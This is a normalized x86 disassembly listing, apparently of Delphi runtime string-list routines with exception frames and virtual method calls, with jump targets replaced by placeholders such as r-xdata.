mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41b02a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41a550
call sub_403234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41b038
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4033c0
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41a30c
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_41afc0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41ad58
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41a3f4
sub_41b0a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_41a550
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41a604
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41a358
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_41ad58
mov eax ebx
call sub_41afc0
pop edi
pop esi
pop ebx
retn
sub_41b0f4
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41bc4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41b124
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41b148
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b16c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b213
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41b1f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1fd
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41b224
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41aa64
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41b2a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
sub_41b2d4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41b38c
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41b32c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41bae4
mov eax [ ebp - 0x8 ]
push eax
push sub_41bd94
push ebp
call sub_41b2d4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b38c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b421
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b428
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404414
jne r-xdata
sub_41b438
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41b434
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
jmp sub_4039c0
sub_41b470
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b4b8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405efc
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41b438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4bf
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41b4c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b5a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41b57e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b585
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
sub_41b5bc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41b601
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044c8
call sub_408ba0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b608
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41b610
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b71b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4040a0
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_4040f8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b722
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042c8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042c8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_402998
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_402998
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
sub_41b738
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b7b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7b7
lea eax [ ebp - 0xc ]
call sub_404008
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41b7c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404528
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41be24
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041f0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c6e8
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b88e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41b898
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41b8cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41b8fc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c960
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b944
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b94b
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41b950
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b9ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41b9d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41c4ac
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9d7
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
sub_41b9fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ba9d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41baa4
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41ba80
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
sub_41baac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41bae4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bb88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41e69c
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_41bb63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d738
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41f33c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb6a
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
sub_41bb94
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c960
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bbdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbe6
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41bbec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bc39
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41c710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc40
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41bc4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405a50
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41bc80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bcc3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404200
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bcca
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41bcd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bd84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor edx edx
push ebp
push sub_41bd67
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd6e
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41bd94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41be0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41fee8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41fef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be11
lea eax [ ebp - 0xc ]
call sub_404008
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ff90
inc esi
dec ebx
jne r-xdata
sub_41be3c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41be58
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b0f4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404abc
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41bec0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b470
jmp r-xdata
sub_41bf5c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404abc
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41bf9c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402998
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ba8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41c008
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41b470
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41c064
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41c064
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41c088
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
